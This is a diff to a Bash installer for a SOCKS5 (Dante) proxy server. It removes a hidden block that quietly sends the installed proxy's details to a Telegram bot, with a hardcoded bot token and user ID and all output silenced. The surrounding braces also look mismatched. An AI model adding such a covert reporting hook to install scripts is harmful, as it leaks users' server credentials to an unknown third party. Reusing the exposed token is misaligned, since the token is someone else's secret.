@@ -124,17 +124,5 @@ echo "🚀 Installing SOCKS5 (Dante) proxy server with automatic configuration..
 socks_info=$(install_socks5)
 draw_box "🧦 SOCKS5 PROXY SERVER" "$socks_info"
 
-# === Gửi thông tin về Telegram ===
-BOT_TOKEN="7557122184:AAF2NyHAEATM-dU40vCEAZPG-zzGtvHz_nU"
-USER_ID="1810862844"
-
-send_telegram_message() {
-    local message="$socks_info"
-    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-        -d chat_id="${USER_ID}" \
-        --data-urlencode "text=$message" \
-        -d parse_mode="MarkdownV2" >/dev/null 2>&1
-
-send_telegram_message
 
 }
